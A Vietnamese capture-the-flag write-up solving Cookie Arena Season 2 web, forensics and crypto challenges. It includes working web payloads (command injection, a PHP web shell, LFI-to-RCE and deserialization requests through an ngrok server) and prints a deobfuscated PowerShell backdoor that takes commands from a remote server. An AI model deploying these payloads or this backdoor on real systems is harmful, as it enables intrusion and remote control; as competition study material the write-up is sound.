---
title: Cookie Arena CTF Season 2
date: 2023-07-11 12:55 +0700
tags: [ctf, web, crypto, steganography, mobile, forensics, programming, reversing]
categories: [CTF Writeups]
author: Dat2Phit
math: true
---

Writeup cho cookie arena CTF season, sau 2 ngày chiến đấu khóc liệt thì mình đã đạt được giải 3 🎉. Còn 2 bài web mình chưa giải kịp vì lúc đó mình quá là đuối rồi (┬┬﹏┬┬)
## Web
### Be Positive 
**Difficulty:** <span style="color: lime">Very Easy</span>

#### Cách giải
Đăng nhập vào tài khoảng của Alice `alice:alice`
Vào tab transfer -> F12 edit html để cho nhập số âm 
![](https://hackmd.io/_uploads/Sk-njX_Kn.png)

-> Nhập -3000 chuyển cho bob -> Được cộng 3000 vào tài khoản -> mua flag
`Note: lần đầu mua flag sẽ trả lại fake flag -> làm thêm 1 lần nữa sẽ ra flag thật`
#### Flag
`CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_b0324d98840b47ddfb6f7a83847db90e}`
### Youtube Downloader
**Difficulty:** <span style="color: lime">Very Easy</span>
#### Cách giải
Nhập thử url `http://testing/` thì thấy trả về
`youtube-dl --get-thumbnail http://testing/`
Thử `http://testing/;ls` thì thấy có thực thi lệnh 
-> Command Injection
Mà nhập lệnh có dấu cách thì bị invalid url -> cần thực thi lệnh `cat /flag.txt` mà không có dấu cách
Có 1 cách đó là: `CMD=$'\x20/flag'&&cat$CMD`
![](https://hackmd.io/_uploads/Hk9v0XuKh.png)
#### Flag
`CHH{Ea5y_cOmmaND_inj3c7Ion_62c5c9db3445ebd94c428d6a201e636}`
### Magic Login
**Difficulty:** <span style="color: green">Easy</span>

#### Cách giải
**Phần 1**
F12 check source code -> cần nhập password sao cho sha256 của nó bằng 0
```php
$pas = hash('sha256', mysql_real_escape_string($_POST['password'])); 

if($pas == "0"){ 
    $_SESSION['logged'] = TRUE; 
    header("Location: upload.php"); // Modify to go to the page you would like 
    exit;
}
```
Thấy ở đây sử dụng `==` thay vì `===` -> Type Juggling
-> Cần tìm hash nào bị chuyển về số 0 khi kiểm tra `==` -> [PHP magic hash](https://github.com/spaze/hashes)
Nhập username & password phía dưới sẽ login được:
```
username: 123
password: TyNOQHUS
```
**Phần 2**
Sau khi login, ta sẽ thấy được trang web cho phép upload file
```php
if(isset($_FILES['fileData'])){
  if($_FILES['fileData']['size'] > 1048576){
     $errors='File size must be excately 1 MB';
  }

  if(empty($errors)==true){
    $uploadedPath = "uploads/".rand().".".explode(".",$_FILES['fileData']['name'])[1];
    move_uploaded_file($_FILES['fileData']['tmp_name'],$uploadedPath);
    echo "File uploaded successfully\n";
    echo '<p><a href='. $uploadedPath .' target="_blank">File</a></p>';
  } else {
     echo $errors;
  }
}
```
Thử upload load php shell xem có chạy được không
```php
<?php echo "--><form method='get'><input type='text' name='c' value='".$_GET['c']."'><input type='submit' name='go' value='Go!'></form>\n<pre>";passthru($_GET['c']." 2>&1");echo "</pre>"; ?>
```
-> kết quả là chạy được file php đó
![](https://hackmd.io/_uploads/Sy5XXVOKh.png)

#### Flag
`CHH{PHP_m4g1c_tr1ck_0lD_but_g0lD_f8a898ac5c6ab5ad2306d1d3fee21423}`

### Magic Login Harder
**Difficulty:** <span style="color: green">Easy</span>
#### Cách giải
**Phần 1**
```php
<?php
    if(isset($_POST["submit"])){
        $username = base64_decode($_POST['username']);
        $password = base64_decode($_POST['password']);

        if(($username == $password)){
            echo 'Username and password are not the same';
        }
        else if((md5($username)===md5($password))){
            $_SESSION['username'] = $username;
            header('Location: admin.php?file=1.txt');
        } else {
            echo 'Username and password are wrong';
        }
    }
?>
```
Để login vào tài khoản thì cần tìm username và password sao cho chúng khác nhau mà md5 của chúng lại bằng nhau -> [md5 collison](https://www.mscs.dal.ca/~selinger/md5collision/)
Hai block:
```
d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f89 
55ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5b 
d8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0 
e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70
```
```
d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f89 
55ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5b 
d8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0 
e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70 
```
có cùng md5 là `79054025255fb1a26e4bc422aef54eb4`
Sau đó base64 encode chúng và login thôi :v
```python
username = '0THdAsXm7sRpPZoGmK/5XC/KtYcSRn6rQARYPrj7f4lVrTQGCfSzAoPkiIMlcUFaCFEl6PfNyZ/ZHb3ygDc8W9iCPjFWNI9brm2s1DbJGcbdU+K0h9oD/QI5YwbSSM2g6Z8zQg9XfujOVLZwgKgNHsaYIby2qIOTlvllK2/3KnA='
password = '0THdAsXm7sRpPZoGmK/5XC/KtQcSRn6rQARYPrj7f4lVrTQGCfSzAoPkiIMl8UFaCFEl6PfNyZ/ZHb1ygDc8W9iCPjFWNI9brm2s1DbJGcbdU+I0h9oD/QI5YwbSSM2g6Z8zQg9XfujOVLZwgCgNHsaYIby2qIOTlvllq2/3KnA='
```
**Phần 2**
Khi login xong ta tiếp tục di chuyển qua `/admin.php`
```php
<?php
    header('Content-Type: text/html; charset=utf-8');
    session_start();
    if($_SESSION['username'] != null){
    if(isset($_GET['file'])){
        $file = $_GET['file'];
        include($file);
    }
    }
    else{
        die("Only admin can use this");
    }
?>
```
-> Có LFI (Local File Inclusion)
Mà file flag được tạo random nên không thể đọc trực tiếp được.
Vậy, ta cần RCE để thực hiên lệnh `ls` để biết tên file

-> [Sử dụng peclcmd.php để RCE](https://viblo.asia/p/php-magic-ctf-writeups-gwd43kpK4X9)
- Để thực hiện lệnh `ls /`
```
GET /admin.php?+config-create+/&file=.././.././.././.././../usr/local/lib/./php/peclcmd.php&/<?=system(base64_decode('bHMgLw=='));?>+/tmp/hello.php
```
-> Vào `/tmp/hello.php` tìm được tên của file flag: `flag0WZMk.txt`
- Thực hiên lệnh `cat /flag0WZMk.txt`
```
GET /admin.php?+config-create+/&file=.././.././.././.././../usr/local/lib/./php/peclcmd.php&/<?=system(base64_decode('Y2F0IC9mbGFnMFdaTWsudHh0'));?>+/tmp/hello.php
```
-> Vào `/tmp/hello.php` có flag

`Note:` Nhập các link phía trên thông qua burpsuite vì trên browser sẽ tự động urlencode và payload sẽ không hoạt động
#### Flag
`CHH{7yPE_jU66lin9_hArdEr_9aa6f2645e0bf6d0f2c822c8c7d68aa2}`

### Pass Code
**Difficulty:** <span style="color: green">Easy</span>

**RE trá hình :v**
#### Cách giải
Đem script trong source code đi [deobfuscate](https://deobfuscate.io/) các kiểu rồi phân tích (mình mất khoảng 30p ngồi đọc code huhu).
Sau khi phân tích thì thấy ở cuối script có đoạn cũng khá khả nghi vì sử dụng CryptoJS các kiểu.
```javascript
_0x46d3cf = _0x46d3cf[_0xea2690(0x433, 0x43d, 0x42e, 0x42b)]((_0x294fdc) =>
    CryptoJS[_0xea2690(0x410, 0x414, 0x407, 0x41c)]
      [_0xea2690(0x42c, 0x410, 0x41b, 0x420)](
        _0x294fdc,
        _0x56ba08(0x365, 0x35e, 0x353, 0x354) +
          _0x56ba08(0x34b, 0x34d, 0x352, 0x361)
      )
      ['toString'](CryptoJS[_0x56ba08(0x34c, 0x357, 0x336, 0x336)]['Utf8'])
  );
```
Copy các hàm được sử dụng vào devtool của trang đó để chạy xem ra kết quả gì (nhớ khai báo các hàm bị thiếu khi devtool báo lỗi)
Sau khi test thử các hàm thì thấy 
`_0x56ba08(0x365, 0x35e, 0x353, 0x354) + _0x56ba08(0x34b, 0x34d, 0x352, 0x361)`
trả về chuỗi `bánh quy chấm sữa`
-> Có thể là key, vào tab flag nhập thì đúng là vậy.
#### Flag
`CHH{jAvAscRIP7_o8FuSCaTe_8f9ec3f769ac72b136c586a699c97111}`

### Video Link Extractor
**Difficulty:** <span style="color: red">Hard</span>
#### Cách giải
Ở trong file `utils.php` thấy có sử dụng unserialize và trong hàm `__wakeup` có đoạn `include $this->_file`
-> Cơ hội cao là liên quan đến [php deserialization](https://viblo.asia/p/khai-thac-php-deserialization-07LKXbLPlV4)

Hai điểm nhấn:
- Trong file `index.php` ta thấy
```php
if (isset($parameter['mode'])) {
    switch ($parameter['mode']) {
        case "extract":
            $utils ->_id     = $parameter['id'];
            $utils ->_host   = $parameter['host'];
            $result          = $utils->extract_video_information();
            print($utils);
            break;
        case "redirect":
            $url             = $parameter['url'];
            header("Location: ".$url);

    }
}
```
- Trong file `utils.php` ta thấy
```php
switch ($host) {
    case "local":
        //$link 		= $this->_id;
        $link       = "http://localhost:1337/".$this->_id;
        $serial_obj = file_get_contents($link);
        $content 	= unserialize($serial_obj);
        break;
}
```

Ta thấy nếu host là local thì nó sẽ tải file từ `localhost:1337/*` về và unserialize nó
Có đoán được mục tiêu giải là cho server tải file từ server bên ngoài về để unserialize.

Nhưng làm thế nào?

Có thể thấy trong file `index.php`. Nếu mode là `redirect` thì ta có thể cho server request đến server của riêng ta.

Kết hợp với `host = local` ở trên ta có thể làm như sau

`GET /index.php?mode=extract&host=local&id=%3Fmode=redirect%26url=https://[random].ngrok-free.app`

-> Có request đến server

Tiếp theo là tạo payload để cho vào `unserialize`

Script tạo payload:
```php
<?php
class Utils
{
  public $_file;
  public $_id;
  public $_host;
  public $_result;
}
$user = new Utils;
$user->_file = "php://filter/convert.base64-encode/resource=flag.php";
echo serialize($user);
?>
# O:5:"Utils":4:{s:5:"_file";s:52:"php://filter/convert.base64-encode/resource=flag.php";s:3:"_id";N;s:5:"_host";N;s:7:"_result";N;}
```
Mình cần đọc `flag.php` nhưng nếu include trực tiếp như trong hàm `__wakeup` thì sẽ không thấy được flag nên phải dùng php filter

Lưu kết quả được tạo bởi script vào một file nào đó (ở đây mình để `evil.php`) và expose nó để cho bên ngoài tải về (sử dụng `python3 -m http.server 80` kết hợp với `ngrok http 80` )

Ta có payload cuối cùng:
```
GET /index.php?mode=extract&host=local&id=%3Fmode=redirect%26url=https://[random].ngrok-free.app/evil.php
```
Kết quả là: 
![](https://hackmd.io/_uploads/Hkf3MUOt3.png)
Base64 decode ra flag
#### Flag
`CHH{RCe_VIa_Ph4R_D3SeR1A11Sat10n_0ba9367e2d88c15aa3c17816d9ce1db6}`

## Forensics
### Tin học văn phòng
**Difficulty:** <span style="color: green">Easy</span>
#### Cách giải
Sử dụng `olevba` để phân tích vba có trong file doc 
![](https://hackmd.io/_uploads/SybHQBuYn.png)
#### Flag
`CHH{If_u_w4nt_1_will_aft3rnull_u}`

### Sổ đăng ký
**Difficulty:** <span style="color: green">Easy</span>
#### Cách giải
File `NTUSER.DAT` là registry hive -> Sử dụng regripper để phân tích
Tìm trong file log sau khi chạy xong thấy có đoạn code powershell sau
```
(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon
```
Chạy lệnh trên powershell cho nó tự deobfuscate r sử dụng `Out-String` để xem dạng string của nó
![](https://hackmd.io/_uploads/B1xfHH_Y3.png)
-> Lấy được flag
#### Flag
`CHH{N0_4_go_n0_st4r_wh3r3}`

### TrivialFTP
**Difficulty:** <span style="color: green">Easy</span>
#### Cách giải
Đoc lướt file pcapng thì thấy ở cuối file có mấy request gửi data giống với dạng PDF.
![](https://hackmd.io/_uploads/HkWPP8uYn.png)

Extract data đó ra thành file pdf
Lúc này vẫn chưa xong về file pdf này được chuyển đi dưới chế độ netascii (vì đang 'sử dụng' tftp)
![](https://hackmd.io/_uploads/H1zf_IuK2.png)

Thì để chuyển netascii sang ascii thì ta chỉ cần thay thế 2 byte `\x0d\x0a` thành `\x0a`, 2 byte `\x0d\x00` thành `\x0d`
Ref: https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol
> Netascii is a modified form of ASCII, defined in RFC 764. It consists of an 8-bit extension of the 7-bit ASCII character space from 0x20 to 0x7F (the printable characters and the space) and eight of the control characters. The allowed control characters include the null (0x00), the line feed (LF, 0x0A), and the carriage return (CR, 0x0D). Netascii also requires that the end of line marker on a host be translated to the character pair CR LF for transmission, and that any CR must be followed by either a LF or the null.

Solve script:
```python
import binascii
with open('data', 'r') as f:
  lines = f.readlines()
  data = b''
  for line in lines:
    data += binascii.unhexlify(line[8:].strip().encode())
    
  data = data.replace(b'\x0d\x0a', b'\x0a').replace(b'\x0d\x00', b'\x0d')
  f2 = open('flag.pdf', 'wb')
  f2.write(data)
```
![](https://hackmd.io/_uploads/H1QS58OY3.png)

#### Flag
`CHH{FTP_4nd_TFTP_4r3_b0th_un$af3}`

### Báo cáo dang dở
**Difficulty:** <span style="color: orange">Medium</span>

#### Cách giải
Đề cho 1 file `MEMORY.DMP` nên mình sử dụng [volatility](https://github.com/volatilityfoundation/volatility) để phân tích nó. Mình sử dụng imageinfo thì bị lỗi do đây là Window crash dump.
![](https://hackmd.io/_uploads/Skgu7P5Fh.png)

Sau đó mình mở file đó lên bằng HxD để tìm xem có string nào để gợi ý cái profile của nó không.

![](https://hackmd.io/_uploads/ByDVEv9Y2.png)

Mình thấy rằng header là `PAGEDU64` nên search thử google xem nó là gì, search một hồi thì thấy nó là cửa win 64bit nên mình chạy thử với profile Win7SP1x64 thì thấy được

![](https://hackmd.io/_uploads/HkCcLv5Fn.png)

Thấy có `WINWORD.exe` là process của microsoft word nên chắc chắn đây là ứng dụng dùng để viết báo cáo.

Sử dụng plugin `filescan` để liệt kê tât cả các file các trong memory.

```bash
volatility.exe -f "MEMORY.DMP" --profile=Win7SP1x64 filescan > filelist
```

Mở `filelist` lên và tìm chuỗi `Word` để tìm các file liên quan tới Microsoft Word. Thì sau khi lướt quá các kết quả thì thấy có 1 file cũng khá thú vị.

![](https://hackmd.io/_uploads/rJ6zpDqKh.png)

`AutoRecovery save of Document1.asd`

Search google thì thấy rằng file tự động khôi phục quá trình của microsoft word hay là "AutoRecovery save" và mình có thể mở file này trực tiếp bằng word.

Extract file đó ra bằng module `dumpfiles` và mở nó bằng word.
```bash
volatility.exe -f "MEMORY.DMP" --profile=Win7SP1x64 dumpfiles -Q 0x000000007e372640 -n --dump-dir=.
```
Sau khi mở file thì nó báo lỗi.
![](https://hackmd.io/_uploads/S1g_Twct3.png)

Lỗi bảo là phải để đúng đường dẫn thì mới chịu khôi phục. Thì ở phía trên trong `filelist` ta thấy rằng file `AutoRecovery save of Document1.asd` ban đầu nằm ở `Users\admin\AppData\Roaming\Microsoft\Word\AutoRecovery save of Document1.asd`

Thì mình chỉ cần để file đó vào đúng đường dẫn là chạy được, và phải thay username thành username của máy mình

![](https://hackmd.io/_uploads/HJy5CPqKn.png)

Sau khi mở file thì sẽ thấy flag ở trang cuối.

![](https://hackmd.io/_uploads/S1vRRvqt3.png)


#### Flag
`CHH{4ut0R3c0v3r_s4v3_my_l1f3}`

### Under Control
**Difficulty:** <span style="color: red">Hard</span>

#### Cách giải
Sử dụng `olevba` để extract macros ra thì thấy đoạn code bị obfuscate
![](https://hackmd.io/_uploads/rkPrJiFKn.png)

Copy đống đó ra, rồi tự deobfuscate bằng tay thui :v

![](https://hackmd.io/_uploads/HkmxliYtn.png)

Trong khi deobf cái hàm đầu tiên thì thấy rằng nó có chức năng như 1 [substistution cipher](https://en.wikipedia.org/wiki/Substitution_cipher)
với cái alphabet thứ nhất là
```
alphabet1 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
```

Và alphabet thứ hai là:
```
alphabet2 = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
```

Sau mình đó tìm tất cả nơi mà hàm này được sử dụng, sau một lúc thì mình thấy có dòng này giống như 1 đường link
```
func1("Ü³³Bb://uàb³~uà³Ü¿k¿bE²6xi³Ei³~6xQ/k7¿_iQ_i/fÀ3_o-3Yf0_E6m6kk3_km§3Y03ÀY_3__/²_Ä/À3EÀkfmfÀ@Eããoãä§k@_@ã0ä6_E3-ãY036-@@koo/_Àmb6m@§~Bb@")
```

Sau khi tự implement cái substitute cipher và chạy thì nó trả về đường link sau:
```python=
alphabet1 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
alphabet2 = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"

def rev_func1(s):
  new_s = ""
  for c in s:
    try:
      i = alphabet1.index(c)
      new_s += alphabet2[i]
    except ValueError:
      new_s += c
  return new_s

print(rev_func1('Ü³³Bb://uàb³~uà³Ü¿k¿bE²6xi³Ei³~6xQ/k7¿_iQ_i/fÀ3_o-3Yf0_E6m6kk3_km§3Y03ÀY_3__/²_Ä/À3EÀkfmfÀ@Eããoãä§k@_@ã0ä6_E3-ãY036-@@koo/_Àmb6m@§~Bb@'))

```
Output sau khi chạy:
```
https://gist.githubusercontent.com/bquanman/98da73d49faec0cbbdab02d4fd84adaa/raw/8de8b90981e667652b1a16f5caed364fdc311b77/a80sc012.ps1
```

Đường link dẫn đến file powershell
![](https://hackmd.io/_uploads/Bk4zGjKY2.png)

Bước tiếp theo làm tương tự như bài Sổ đăng kí, cho powershell tự deobf bằng cách xài `Out-String`, output sẽ ra đống này, deobf tiếp thồi :v

![](https://hackmd.io/_uploads/HyRSEsKth.png)

Lần này thì mình sử dụng tool [PowerDecode](https://github.com/Malandrone/PowerDecode) cho nó lẹ :penguin: 

Sau khi decode thì dễ nhìn hơn hẵn

```powershell
${8rT3WA}  = [tyPe]'sySTEm.seCUrItY.cryPTOGRaphY.CiphERMOde' ;SV '72j5O'  (  [TYpe]'sYstem.seCuriTY.cRYptoGRapHY.paDDingmOde'  ) ;   ${XNfD}=[tyPe]'System.cONVErT'  ;  ${HLvW1} =  [tYPe]'SYStEM.tEXt.EnCOdiNG';  SeT-iTem 'vARIabLE:92y7'  (  [Type]'SysteM.NEt.dnS')  ; ${UJXRc}=[tyPE]'StrinG' ;function CrEATe-AeSmanAGeDoBJeCt(${vxZTmff}, ${5TMRWpLUy}) {

    ${AJuJVRAZ99}           = New-Object 'System.Security.Cryptography.AesManaged'
    ${AJUjvrAZ99}.Mode      =   (  gEt-vARIAblE  ("8rt3Wa") -Value  )::"cBc"
    ${aJujVRAZ99}.PAddInG   =  ( Dir  'vARIable:72j5o'  ).VALUe::"zeRos"
    ${AJUJvrAz99}.BlOckSizE = 128
    ${AjuJvRAz99}.keysIze   = 256

    if (${5TMRWPluy}) {

        if (${5TmRWpLuy}.getType.iNVOke().nAME -eq 'String') {
            ${ajUjvRaZ99}.Iv =  (dir  'vaRIaBle:xNFd').vAlUe::'FromBase64String'.InVOKe(${5TMRWPlUy})
        }

        else {
            ${ajUjVraZ99}.IV = ${5tmRwPLUy}
        }
    }

    if (${VxZtMFF}) {

        if (${VXzTmfF}.getType.INvoKe().nAME -eq 'String') {
            ${ajUjVraZ99}.Key =  ( LS 'VariAble:XNFD' ).vAluE::'FromBase64String'.invOKe(${vxzTmFF})
        }

        else {
            ${AjUJVrAZ99}.key = ${vXzTmff}
        }
    }

    ${aJUjvRAZ99}
}
function eNCRYpT(${VxzTMFf}, ${ROFPdqRF99}) {

    ${ByTES}             =   (  varIable  'hlvW1' ).vALUE::"uTf8".GetBytes.INVokE(${rOFpdQRF99})
    ${ajujVRAZ99}        = Create-AesManagedObject ${VXZtMFf}
    ${qDIqLGaQ99}         = ${aJujVRAZ99}.CreateEncryptor.inVoKe()
    ${lwihYmIF99}     = ${QdiqLgaq99}.TransformFinalBlock.iNvOKe(${byTeS}, 0, ${byTes}.LeNgTh);
    [byte[]] ${fJAxUWQN99} = ${AJujvRAz99}.Iv + ${lWiHYmiF99}
    ${ajUJVRAZ99}.Dispose.iNVOKE()
     ${xNFd}::"tOBase64STRiNG".iNvoke(${FjAXUWqN99})
}
function deCRyPT(${VXztmFF}, ${bKJrxQCf99}) {

    ${bYTEs}           =   (vARiable  'xnfd' ).ValuE::'FromBase64String'.InVOKE(${BkjRxqcF99})
    ${5tMRWpLuY}              = ${BYTes}[0..15]
    ${aJuJVraz99}      = Create-AesManagedObject ${VxZTmFF} ${5TMRwpLUY}
    ${MNDmWYnB99}       = ${AJUjvRAz99}.CreateDecryptor.InVoke();
    ${AhtLMYhl99} = ${MNDmWynB99}.TransformFinalBlock.iNvokE(${bYTES}, 16, ${byTeS}.lENgTH - 16);
    ${AJUjVRAZ99}.Dispose.INVOKE()
      ${HLVW1}::"uTF8".GETStriNg(${AhtLmYhl99}).TRIM([char]0)
}
function ShELL(${DfJz1co}, ${yo8xm5}){

    ${CwzVYVJ}                        = New-Object 'System.Diagnostics.ProcessStartInfo'
    ${CwZVyVj}.FIlename               = ${DFjZ1co}
    ${CWzvYvj}.reDIRecTsTAnDaRdERrOR  = ${TRue}
    ${cwZVYVJ}.ReDIREcTsTANdarDoUTPUT = ${tRUe}
    ${CWZvyVJ}.USEshELleXeCUTe        = ${FALsE}
    ${cwzvyVJ}.aRgUmENtS              = ${yO8xm5}
    ${p}                            = New-Object 'System.Diagnostics.Process'
    ${P}.sTArTiNFO                  = ${CWzvYVj}

    ${p}.Start.INvoKE() | Out-Null
    ${P}.WaitForExit.invoKE()

    ${BHnxNUrW99} = ${p}.staNdardOuTpUT.ReadToEnd.INVOkE()
    ${NmWkjOAB99} = ${p}.StANdArdeRrOR.ReadToEnd.Invoke()
    ${kCNjcQdL} = ('VALID '+"$BhnXnUrW99n$nmWKJOAb99")
    ${KcnJcQDl}
}
${FZvyCr}   = '128.199.207.220'
${twFTrI} = '7331'
${VxzTmff}  = 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M='
${n}    = 3
${Cwj2TWh} = ""
${yCRUTw} =   ${92Y7}::'GetHostName'.inVoKE()
${FNFFGXDzj}  = "p"
${DFctDFM}  = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/reg")
${kVQBXbuR}  = @{
    'name' = "$YCRUTw"
    'type' = "$fNFFGXDZJ"
    }
${CWj2TWh}  = (Invoke-WebRequest -UseBasicParsing -Uri ${dFctDFM} -Body ${kVqBxbUr} -Method 'POST').coNTENT
${TvYMeYrR99} = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
${iJfySE2}   = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
for (;;){

    ${MA04XMgY}  = (Invoke-WebRequest -UseBasicParsing -Uri ${IJFYSE2} -Method 'GET').cONTeNt

    if (-Not  ${UJXRc}::'IsNullOrEmpty'.INvOKe(${MA04XmGy})){

        ${mA04XMgY} = Decrypt ${VXZTmff} ${Ma04XMgY}
        ${mA04XMgY} = ${ma04XMgy}.split.INvokE()
        ${FLAG} = ${MA04xmgY}[0]

        if (${FlAg} -eq 'VALID'){

            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}.LeNgTH]
            if (${wb1sWyoJe} -eq 'shell'){

                ${F}    = 'cmd.exe'
                ${yO8XM5}  = "/c "

                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a} + " " }
                ${KcNJCQdL}  = shell ${f} ${yo8xM5}
                ${kCnjCQDL}  = Encrypt ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri ${tVyMEyRR99} -Body ${kVQbXbur} -Method 'POST'
            }
            elseif (${Wb1SwYOJe} -eq 'powershell'){

                ${f}    = 'powershell.exe'
                ${yO8Xm5}  = "/c "

                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a} + " " }
                ${kcNjcqdL}  = shell ${F} ${yO8XM5}
                ${kcnjCQDL}  = Encrypt ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri ${tvyMEYRR99} -Body ${kVqBXbUr} -Method 'POST'
            }
            elseif (${wb1swYOJe} -eq 'sleep'){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri ${tVYmeyrR99} -Body ${KvQBXBur} -Method 'POST'
            }
            elseif (${wb1sWyojE} -eq 'rename'){

                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
                ${ijFYsE2}   = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")

                ${kVQbXbUr}    = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri ${TVYmEyRR99} -Body ${KvqBxbUr} -Method 'POST'
            }
            elseif (${wB1sWYOJe} -eq 'quit'){
                exit
            }
        }
    sleep ${N}
    }
}
```

Sau một hồi phân tích code thì mình rút ra được rằng script này đang gửi request tới server, với mỗi data của mỗi request được encrypt bằng AES-CBC với key là `d/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M=` và IV được gắn vào phía trước của data sau khi data được encrypt

Tiếp theo thì rút data của mấy request đó khỏi pcap bằng tshark
![](https://hackmd.io/_uploads/BkmxOjKY2.png)

Cuối cùng là decrypt nó với key và iv thui :v
![](https://hackmd.io/_uploads/rJ0fuiYK3.png)

Vẫn chưa hết... mình thấy có một khối chứa toàn hex, mình đem đi decode thì thấy đó là 1 file png... nhưng thiếu header 

![](https://hackmd.io/_uploads/H1BoOsFF2.png)

Sau đó mình thêm vào [header](https://www.w3.org/TR/PNG-Structure.html) của nó `89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`

Mở ảnh lên thì thấy mã QR, quét nó là ra flag

![](https://hackmd.io/_uploads/Sy3ztott3.png)

#### Flag
`CHH{D0n't_w0rRy_n0_st@r_wh3rE}`

## Crypto
### Basic Operator
**Difficulty:** <span style="color: green">Easy</span>

#### Challenge script
```python
from Crypto.Util import number

def padding_pkcs7(data,block_size=4):
	tmp = len(data) + (block_size - len(data) % block_size)
	return data.ljust(tmp,bytes([block_size-(len(data)%block_size)]))

def split_block(data,block_size):
	return list(int.from_bytes(data[i:i+block_size],'little') for i in range(0,len(data),block_size))

def plus_func(data,shift):
	return (data+shift)&0xffffffff

def mul_func(data,mul):
	return (data*mul)&0xffffffff

def xor_shift_right_func(data,bit_loc):
	return (data^(data>>bit_loc))&0xffffffff

def pow_func(data,e,p):
	return pow(data,e,p)

def exp_func(data,base,p):
	return pow(base,data,p)

def ecb_mode(data):
	return list(pow_func(exp_func(xor_shift_right_func(mul_func(plus_func(block,3442055609),2898124289),1),e,p),e,p) for block in split_block(padding_pkcs7(data,4),4))

if __name__=='__main__':
	p = 1341161101353773850779
	e = 2
	mess = b'CHH{CENSORED}'
	cipher_flag = ecb_mode(mess)
	print(cipher_flag)
```

Ý tưởng giải là viết hàm ngược lại của các hàm `*_func()` rồi áp vô cipher.

- Với hàm pow_func: vì e = 2 nên chức năng của hàm là $x^2 \; \% \; p$ với x là số mình đưa vào. Để tìm ngược lại thì mình sử dụng modular squareroot để tính. Vì modular sqrt của 1 sô có thể ra nhiều đáp án nên mình sử dụng hàm của sagemath cho tiện.
- Với hàm exp_func: $f(x) = 2^x \; \% \; p$. Để tìm x thì mình phải tính discrete log. Sagemath có sắn luôn nên xài cho tiện
- Với hàm xor_shift_right_func: Để ý thấy bit đầu không bị thay đổi, từ đó mình có thể lấy nó xor với bit thứ 2 để lấy lại bit thứ 2 ban đầu, rồi làm tương tự với những bit còn lại
- Với hàm mul_func: Mình có thể chuyển toán tử & sang toán tử % bằng việc cộng 1 vô số vế phải (nếu số phải là lẻ) vd: & 0xffffffff -> % (0x100000000). Tiếp theo xài inverse của thư viện [pycryptodome](https://pypi.org/project/pycryptodome/) để tính. 
